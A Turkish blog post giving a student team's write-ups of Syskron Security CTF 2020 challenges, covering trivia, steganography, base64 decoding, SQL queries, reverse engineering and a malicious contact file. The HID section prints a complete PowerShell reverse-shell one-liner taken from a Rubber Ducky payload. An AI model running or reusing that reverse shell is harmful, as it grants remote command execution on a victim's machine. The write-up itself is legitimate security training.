---
layout: post
title: Syskron Security CTF 2020 Çözümleri - TR
date: '2020-10-26 16:30:00 +0300'
categories: cozumler
---
Merhabalar,
21-26 Ekim arasında gerçekleştirilen [Syskron Security CTF 2020](https://ctftime.org/event/1148)'e takım olarak katıldık.
Yarışmayı `3420` puanla `23.` olarak tamamladık.

[ctftime sayfası](https://ctftime.org/event/1148)

Aşağıda yarışma dahilinde çözdüğümüz soruları bulabilirsiniz.
  
Keyifli okumalar.  
[AUCC](https://twitter.com/_aucc)


# Welcome 
**(20) Welcome ~reading**  
**Soru:** [pdf dosyası]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Welcome/welcome-letter.pdf)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Welcome/welcome_1.png)

Bize verilen pdf dosyasını açıp okuduğumuzda flagı buluyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Welcome/welcome_2.png)

Flag : `syskronCTF{th4nk-you}` 
  
  
# Check Digit 
**(25) # Trivia ~standard**  
**Soru:** 
![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/check-digit_1.png)

Google'da *IEC standard imei check digit* sorgusunu aratırsanız karşınıza [Luhn Algorithm](https://en.wikipedia.org/wiki/Luhn_algorithm)
çıkmakta. Burada da bize sorulan ISO standardı bulunmakta.

Flag : `syskronCTF{ISO/IEC-7812}`



# Deadly Malware 
**(25) # Trivia ~malware**  
**Soru:** 

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/deadly-malware_1.png)

Google'da *malware that caused deaths due to explosion* şeklinde arama yaparsak, [top-5-most-dangerous-industrial-cyberattacks](https://www.stormshield.com/news/top-5-most-dangerous-industrial-cyberattacks/)
sitesi karşımıza çıkıyor.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/deadly-malware_2.png)

Burdaki zararlılardan soruya en uygunu *triton*.

Flag : `syskronCTF{triton}`


# Security framework 
**(25) # Trivia ~framework ~standard**  
**Soru:** 
![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/security-framework_1.png)

Google'da *nist securty framework 1.1* aramasını yaptığımızda çıkan [pdf dosyasını](https://www.nist.gov/system/files/documents/cyberframework/cybersecurity-framework-021214.pdf)
okursak, sayfa 21'deki tabloadan *5 core functions*'u ve kısaltmalarını bulabiliyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/security-framework_2.png)

Flag : `syskronCTF{ID-PR-DE-RS-RC}`

# Vulnerable RTOS 
**(25) # Trivia ~vulnerability**  
**Soru:** 
![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/vulnerable-rtos_1.png)

Google'da *11 zero-day vulnerabilities* aramasını yapınca flag'ımızı ilk aramada buluyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/vulnerable-rtos_2.png)

Flag : `syskronCTF{URGENT/11}`


# DoS attack 
**(100) # Monday ~packet-analysis**  
**Soru:** [pcap dosyası]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/dos-attack.pcap)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/dos-attack_1.png)

Bu soru için bir adet hint aldık. Hint ise *They bought some older SIPROTEC 4 protection relays.* idi.

Google'da  *SIPROTEC 4 DoS attack malware* , diye aratırsak  [bu wikipedia sayfasını](https://en.wikipedia.org/wiki/Industroyer) buluyorduk.

Flag : `syskronCTF{Industroyer}`

# Redacted news 
**(100) # Monday ~forensics**  
**Soru:** [Resim]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/2020-10-1-secureline.png)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/redacted-news_1.png)

Soruda ek olarak verilen resimde sansürlü bir alan vardı.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/redacted-news_2.png)

Resmi [stegsolve.jar](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve) ile açıp renk kanalları ile oynadığımızda
flag gözüküyordu.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/redacted-news_3.png)

Flag : `syskronCTF{d0-Y0u-UNdEr5TaND-C2eCh?}`

# Security headers 
**(100) # Monday ~web**  
**Soru:** [web sitesi- http://www.senork.de](http://www.senork.de)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/security-header_1.png)

Chrome'da Geliştirici Araçlarındaki Network kısmını açıp, soruda verilen [siteye](http://www.senork.de) gittiğimizde,
flag'ın response headerında olduğunu görmekteydik.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/security-header_2.png)

Flag : `syskronCTF{y0u-f0und-a-header-flag}`


# Bash history 
**(200) # Tuesday ~forensics**  
**Soru:** [bash history]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/bash_history)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/bash-history_1.png)

Verilen dosyayı açıp baktığımızda çoğu komutlar normal iken bazılarının base64 ile decode edilmiş hashler içerdiğini gördük.

CyberChef sitesinde [şu tarifi](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)) kullanarak, tüm hashleri çevirdik.

İki tanesi ilgimizi çekti. İlki *ZWNobyBjM2x6YTNKdmJrTlVSbnQwU0dWNU* idi. Çünkü bunu decode ettiğimizde *echo c3lza3JvbkNURnt0SGV5* çıkıyordu,
Çıkan *c3lza3JvbkNURnt0SGV5*'ı tekrar decode edersek flagin ilk parçasının yani *syskronCTF{tHey*'ın çıktığını gördük.

İkincisi ise *xYTjBNR3hsTFdGc2JDMUVZWFJoSVNGOQ==* idi. Sonundaki eşittirlerden base64 olduğuna neredeyse emindik ama hiçbir şekilde decode edilmiyordu.

Flagin ilk kısmını bulduğumuzdan acaba *xYTjBNR3hsTFdGc2JDMUVZWFJoSVNGOQ==* , *ZWNobyBjM2x6YTNKdmJrTlVSbnQwU0dWNU* in devamı mı diye düşündük ve
ikisini uc uca ekleyip 
~~~ 
ZWNobyBjM2x6YTNKdmJrTlVSbnQwU0dWNUxYTjBNR3hsTFdGc2JDMUVZWFJoSVNGOQ==
~~~ 
i elde ettik.

Elde ettiğimiz hashı decode edersek, 
~~~
echo c3lza3JvbkNURnt0SGV5LXN0MGxlLWFsbC1EYXRhISF9
~~~ 
çıkıyordu, çıkan sonuçtaki hashi tekrar decode ettiğimizde flagı bulduk.

[final tarif](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=YzNsemEzSnZia05VUm50MFNHVjVMWE4wTUd4bExXRnNiQzFFWVhSaElTRjk)

Flag : `syskronCTF{tHey-st0le-all-Data!!}`

# Change 
**(200) # Tuesday ~forensics**  
**Soru:** [change.jpg]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/change.jpg)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/change_1.png)

Bize verilen resme, *exiftool* da aşağıdaki komutla ile  baktık
~~~bash
	exiftool change.jpg
~~~

Sonuçlardaki *copyright* bölümünde [şu javascript kodu](https://pastebin.com/NfsipwNE) vardı.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/change_2.png)

Bu kodu Chrome Geliştirici Seçeneklerindeki Console ekranında çalıştırarak flagı bulduk.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/change_3.png)

Flag : `syskronCTF{l00k5l1k30bfu5c473dj5}`

# Leak audit 
**(200) # Tuesday ~sql**  
**Soru:** [Ek dosyası]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/BB-inDu57rY-P0W3R-L34k3r2.tar.gz)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/leak-audit_1.png)

Bize verilen .db uzantılı dosyayı [DB Browser](https://sqlitebrowser.org/) programı ile açtık.

Sorudaki her bir seçenek için aşağıdaki sorguları yaptık

1) `How many employee records are in the file?`
~~~ sql
	 select count(*) from personal
~~~
![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/leak-audit_2.png)


2) `Are there any employees that use the same password? (If true, send us the password for further investigation.)`
~~~ sql
 	SELECT *, COUNT(*) FROM personal GROUP BY password HAVING COUNT(*) > 1
~~~

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/leak-audit_3.png)


3)`In 2017, we switched to bcrypt to securely store the passwords. How many records are protected with bcrypt?`
~~~ sql
	select count(*) from personal where password REGEXP '^\$2[ayb]\$.{56}$'
~~~
bcrypt regex'ini [stackoverflow sorusundan](https://stackoverflow.com/questions/31417387/regular-expression-to-find-bcrypt-hash) aldık.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/leak-audit_4.png)

Flag : `376_mah6geiVoo_21`


# Security.txt 
**(200) # Tuesday ~best-practices**  
**Soru:** 

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/security-txt_1.png)

Bize verilen siteler [https://tools.ietf.org/html/draft-foudil-securitytxt-10](https://tools.ietf.org/html/draft-foudil-securitytxt-10)
ve  [https://www.senork.de/.well-known/security.txt](https://www.senork.de/.well-known/security.txt) idi
Eğer ikinci siteye ulaşamıyorsanız [txt dosyası şurada]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/security.txt)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/security-txt_2.png)


Buradaki [public key](https://www.senork.de/openpgp.asc) ' in detaylarını gpg ile görmek için aşağıdaki komutu çalıştırıyoruz.
Eğer yukarıdaki link kırık ise public keye [buradan]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/openpgp.asc) ulaşabilirsiniz 

~~~bash
	gpg openpgp.asc
~~~

Flag burada.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/security-txt_3.png)

Flag : `syskronCTF{Wh0-put3-flag3-1nto-0penPGP-key3???}`


# HID 
**(300) # Wednesday ~binary-analysis**  
**Soru:**  [inject.bin]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/inject.bin)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/hid_1.png)

Bunun usb rubberducky ile alakalı olduğunu düşündük. Bu yüzden [ducktoolkit](https://ducktoolkit.com/decode#) 
sitesinde verilen binary dosyasını Almanca klavye düzeninde decode ettik. 

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/hid_2.png)

Çıkan sonuçta bir [pastebin linki ](https://pastebin.com/raw/ZRD8jsvd) vardı. 
Eğer Almanca klavye düzeninde yapmazsanız bu link yanlış oluyordu.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/hid_3.png)

Flag pastebin linkinde idi.
~~~
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10syskronCTF{y0u_f0und_m3}",80);$stream = $client.GetStream();[byte[)$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
~~~

Flag : `syskronCTF{y0u_f0und_m3}`


# Key generator 
**(300) # Wednesday ~reverse-engineering**  
**Soru:** [keygen]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/keygen)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_1.png)

Bize verilen dosya 64 bit ELF dosyası idi.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_2.png)

Aşağıdaki resim gibi çalışıyordu, bizden input istiyor ve bize key oluşturuyordu.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/Key generator.png)


Incelemek için ghidra ile açtık, `genserial` fonksiyonunda girilen inputun  `0x6c61736b612121` olup olmadığı kontrol ediliyordu.
Eğer oysa `octal` fonksiyonu çağrılıyordu.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_3.png)

`0x6c61736b612121` i [şu cyberChef tarifinde](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NmMKNjEKNzMKNmIKNjEKMjEKMjE) asciiye çevirdik
ve gizli inputun `laska!!` olduğunu bulduk.
Daha sonra `keygen` i bu input ile çalıştırdık.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_5.png)

Bize kod üretmek yerine uzunca bir çıktı verdi.
~~~
1639171916391539162915791569103912491069173967911091119123955915191639156967955916396391439125916296395591439609104911191169719175
~~~

`octal` fonskiyonuna ghidrada bakarsak, `DAT_00102060` daki veriler `local_218`  değişkenine kopyalanıyordu

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_6.png)

Aşağıdaki ikinci while de ise `local_218` in her 4. karakterini bastırıyordu.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_7.png)

Fonksiyon adının `octal` olmasından dolayı, bu çıktının `octal` olması gerektiğini ve buradaki `9` ların da ayraç olduğunu düşündük.
Çünkü 8lik formatta 9 yoktur. Ayrıca ilk 3 sayıyın ascii' leri de s,y,s veriyordu.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_9.png)

Tüm bunları karşılayan bir python scripti yazdık.

~~~ python
arr="163917191639153916291579156910391249106917396791109111912395591519163915696795591639639143912591629639559143960910491119116
9719175"

for i in arr.split('9'):
	print(chr(int(i,8)),end="")
print()
~~~ 
![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_10.png)

Vee flagimiz çıktı.

Flag : `syskronCTF{7HIS-isn7-s3cUr3-c0DIN9}`

# Screenshot 
**(300) # Wednesday ~image-analysis**  
**Soru:** [Screenshot_2020-05-19_at_11.38.08_AM.png]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/Screenshot_2020-05-19_at_11.38.08_AM.png)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_1.png)
 
`even if it's not that significant` ifadesinden sorunun LSB(Least Significant Bit ) ile alakalı olduğunu anlıyoruz.

Resmi [stegsolve.jar](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve) ile açıp `plane` lere bakarsak
`Red plane 1` de aşağıdaki mesajı görüyoruz.Sorunun LSB ile alakalı olduğunun ikinci bir kanıtı.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_2.png)

Ayrıca `Green plane 0` da iki mesaj görüyoruz, birincisi en sağ altta

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_3.png)

ikincisi üst ortada. İkincisi dikey olduğundan sanki bize column odakli bir LSB varmış gibi izlenim veriyor.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_4.png)

stegsolve uygulamasında `extract` kısmında aşağıdaki seçeneklerle veriyi çıkartıyoruz. `Green plane 0` , `LSB`, `Column`

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_5.png)

[Çıktı dosyasında]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/Screenshot_output.txt)  's' karakterini aradığımızda flagi buluyoruz.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_6.png)

Flag : `syskronCTF{s3cr3T_m3sS4g3}`
 
# Contact card 
**(400) # Thursday ~malware**  
**Soru:** [confidential.zip]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/confidential.zip)
`pass`: `edeb142`


![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/contact-card_6.png)

Biraz araştırma sonucunda bu sorunun [şuradaki makale](ttps://www.hackingarticles.in/exploiting-windows-pc-using-malicious-contact-vcf-file/) ile alakalı olduğunu düşündük.
ve `.contact` dosyaları içinde vsCode yardımı ile `http.\\` aradık.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/contact-card_2.png)

`Maximilian Baecker.contact` adındaki dosyada kullanılıyordu ve `http` klasöründeki `www.random4.cpl` i açıyordu.
`www.random4.cpl` dosyası aslında 32 bit windows executable'ıydı. 

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/contact-card_3.png)

Belirtilen contact  dosyasında oraya tıklarsak bir popup çıkıyordu ve bizi  [pastebine](https://pastebin.com/raw/xSAvEyND) 
yönlendiriyordu.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/contact-card_4.png)


![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/contact-card_5.png)


Flag : `syskronCTF{n3v3r_c11ck_unkn0wn_11nk5}`

# Exposed webcam 
**(400) # Thursday ~webcam**  
**Soru:** 

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_1.png)

[verilen sitede](https://www.senork.de/camtest/front/cam1) karşımıza bir kamera çıkıyordu

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_2.png)

`configration->maintenance->reboot` yolunu izleyerek kamerayı yeniden başlattığımızda

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_3.png)

bizi [hata sayfasına](https://www.senork.de/camtest/front/cam1/setup/bvKPRB9QvHR6v64HoJqfzbRrZpwQD9.html) yönlendiriyordu.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_4.png)

Bu sitedeki hata kodu 
~~~
Li4vYmFja3VwXzIwMjAvMjAyMC0xMC0yMC1yb290LXJlc3RvcmUuYmFja3Vw
~~~ 
idi. 
Bunu [şu cyberChef tarifinde ](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=TGk0dlltRmphM1Z3WHpJd01qQXZNakF5TUMweE1DMHlNQzF5YjI5MExYSmxjM1J2Y21VdVltRmphM1Z3)
decode ettik. Sonuç `../backup_2020/2020-10-20-root-restore.backup`  çıkıyordu.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_5.png)

Çıkan sonuç bir dosya yoluna benzediğinden [bu linkten](https://www.senork.de/camtest/front/cam1/backup_2020/2020-10-20-root-restore.backup) 
backup dosyası çıkıyordu. Bu dosya aslında şifreli bir zip dosyasıydı.
Yukarıdaki link kırık ise [buradan]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/2020-10-20-root-restore.backup) indirebilirsiniz.

Şifre araştırmasına başladık. `View parameters` sayfasında `testuser`'in şifresini bulduk.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_6.png) 

`mmDi54YChNNYNMQM9y9PH48uKVcMQX` . Ama bu backup'un şifresi değildi.

İkinci olarak `security` sayfasında *'lar ile gizlenmiş bir şifre vardı. Ögeyi inceleden baktık ve bu backup dosyasının şifresiydi.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_7.png)

Backup dosyasını `dYzqmTkKv457BENsKBGSfD5vcudrXe` ile çıkardığımızda içinden `testuser.backup` çıkıyordu. 
Çıkan dosya da şifreli bir zip dosyası idi neyseki onun şifresini daha önceden bulmuştuk , `dYzqmTkKv457BENsKBGSfD5vcudrXe` . 

Bundan da `testuser.backup` çıkıyordu ve sonunda bu içinde flag olan normal bir dosyaydı.

Flag : `syskronCTF{why-1s-th1s-file-here?}`



# Firmware update 
**(500) # Friday ~reverse-engineering ~crypto**  
**Soru:** [LibrePLC_firmware_pack.zip]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/LibrePLC_firmware_pack.zip)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_1.png)

Note: `5157CA3SDGF463249FBF`

Verilen zip dosyasından 3 tane şifreli zip dosyası çıktı.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_2.png)

İlkinin flagı soruda Note kısmında verilen `5157CA3SDGF463249FBF` idi.

İlk dosyayı açtık, 2 dosya vardı. `key` dosyası python dilinde yazılmış bir koddu ve bizden bir arguman ile
çalıştırmamızı bekliyordu.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_3.png)

Aşağıdaki komut ile çalıştırdığımızda
~~~ bash
python3 LibrePLC_fw_1.0.0/key LibrePLC_fw_1.0.0/LibrePLC_fw_1.0.0.bin 
~~~ 
~~~
7SYSCC3076BDCTF13CC9CTFA6CB7SYSCC3076CD56579549EC5AB533EN03AFC1F9N
~~~ 
çıktısını üretiyordu ve
bu ikinci zip dosyasının şifresiydi.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_4.png)

İkinci dosyada bi dosya vardı ve önceki çalıştırdığımız komutu bu dosyaya karşı kullandık.
Bu da 
~~~
CSYS0BBA60E46ABB19C5BC0CSYS0CCK60EQ1NC41E2C5DDA4C5C7D45E096162
~~~
çıktısını üretti.
Ve bu çıktı 3.zip dosyasının şifresiydi.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_5.png)

Sonuncu zip dosyasınını da çıkarınca bize yine öncekilere benzer bi dosya verdi.
Hex editor ile açtığımızda flag en üstte karşımızadaydı.

~~~ bash
head -n 2  ./LibrePLC_fw_1.0.2/LibrePLC_fw_1.0.2.bin| xxd
~~~ 

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_6.png)

Flag : `syskronCTF{s3Cur3_uPd4T3}`
